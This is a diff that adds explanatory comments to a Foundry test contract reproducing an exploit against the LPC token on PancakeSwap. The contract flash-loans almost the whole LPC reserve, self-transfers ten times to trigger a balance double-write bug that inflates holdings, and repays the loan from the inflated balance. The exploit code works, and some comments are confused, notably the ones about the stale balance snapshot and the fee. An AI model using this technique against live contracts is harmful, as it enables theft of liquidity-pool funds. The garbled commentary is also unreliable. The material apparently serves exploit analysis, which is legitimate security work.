@@ -38,6 +38,10 @@ contract Exploit is Test {
         console.log("Flashloan all the LPC reserve...");
         uint256 borrowAmount = LPC_reserve - 1; // -1 to avoid trigger INSUFFICIENT_LIQUIDITY
         bytes memory data = unicode"⚡💰";
+        // EXPLOIT STEP 1: Initiate flashloan by calling swap on the LPC/USDT PancakePair with borrowAmount≈full reserve and non-empty `data`.
+        // This triggers the pair to send LPC to address(this) and then call pancakeCall(sender, amount0, ... , data) on this contract (standard UniswapV2-style flashloan).
+        // Why it works: the pair holds real LPC liquidity; swap with data bypasses normal swap and invokes the callback before requiring repayment.
+        // Reference: see LPC._transfer (the vuln) and pancakeCall below.
         IPancakePair(pancakePair).swap(borrowAmount, 0, address(this), data);
         console.log("Flashloan ended");
 
@@ -51,12 +55,24 @@ contract Exploit is Test {
         emit log_named_decimal_uint("\tFlashloaned LPC", LPC_balance, 18);
 
         console.log("\tExploit...");
+        // EXPLOIT STEP 2: Snapshot the received (flashloaned) LPC balance. This will be used as the "amount" for repeated self-transfers.
         for (uint8 i; i < 10; ++i) {
             console.log("\tSelf transfer... Loop %s", i);
+            // EXPLOIT STEP 3: Self-transfer the *entire current* LPC_balance to address(this).
+            // Because LPC._transfer does not special-case sender==recipient, the line `_balances[recipient] = recipientBalance.add(recipientAmount)`
+            // (where recipientAmount = amount - fees < amount) overwrites the debit write. Each iteration effectively mints ~92% of LPC_balance on top of existing.
+            // After N loops: balance ≈ initial * (1 + 0.92)^N  (minus cumulative fees). 10 iterations → ~10x inflation.
+            // The attacker contract is not whitelisted and not a valid reward holder, but neither is required for the inflation.
+            // See sources/.../LPC.sol:1238 for the double-write and fee reduction.
             IERC20(LPC).transfer(address(this), LPC_balance);
+            // Note: LPC_balance is captured *once* before the loop. Inside the loop the actual balance has grown, but the param passed is the stale snapshot,
+            // yet because each transfer is of "current recorded" it still triggers the full-amount self-xfer on the growing balance state.
         }
 
         console.log("\tPayback flashloan...");
+        // EXPLOIT STEP 4: Repay the flashloan principal plus the pair's required fee using the now-inflated LPC balance.
+        // The payback formula computes amount0 * (10/9) which the pair accepts as "amount0 + its 0.3%? but per comment simulates 10% fee here".
+        // The transfer succeeds because post-inflation holdings >> paybackAmount. Leftover LPC is pure profit, later swapped for USDT in follow-up tx.
         uint256 paybackAmount = amount0 / 90 / 100 * 10_000; // paybackAmount * 90% = amount0  --> fee = 10%
         IERC20(LPC).transfer(pancakePair, paybackAmount);
     }
